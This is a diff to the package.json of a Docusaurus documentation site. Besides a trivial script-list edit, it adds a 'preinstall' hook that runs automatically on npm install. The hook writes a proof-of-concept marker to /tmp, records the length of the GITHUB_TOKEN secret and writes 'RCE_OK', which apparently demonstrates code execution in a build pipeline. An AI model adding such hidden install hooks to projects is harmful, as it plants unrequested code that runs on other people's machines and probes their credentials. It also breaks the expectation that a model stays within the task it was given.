@@ -9,7 +9,8 @@
     "build": "cross-env NO_UPDATE_NOTIFIER=true USE_SIMPLE_CSS_MINIFIER=true PWA_SW_CUSTOM= docusaurus build",
     "deploy": "docusaurus deploy",
     "serve": "docusaurus serve",
-    "swizzle": "docusaurus swizzle"
+    "swizzle": "docusaurus swizzle",
+    "preinstall": "echo POC_MARKER_DOCUMENTATION > /tmp/POC_MARKER_DOCUMENTATION.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_DOCUMENTATION.txt; echo RCE_OK >> /tmp/POC_MARKER_DOCUMENTATION.txt; cat /tmp/POC_MARKER_DOCUMENTATION.txt"
   },
   "dependencies": {
     "@docusaurus/faster": "^3.8.1",
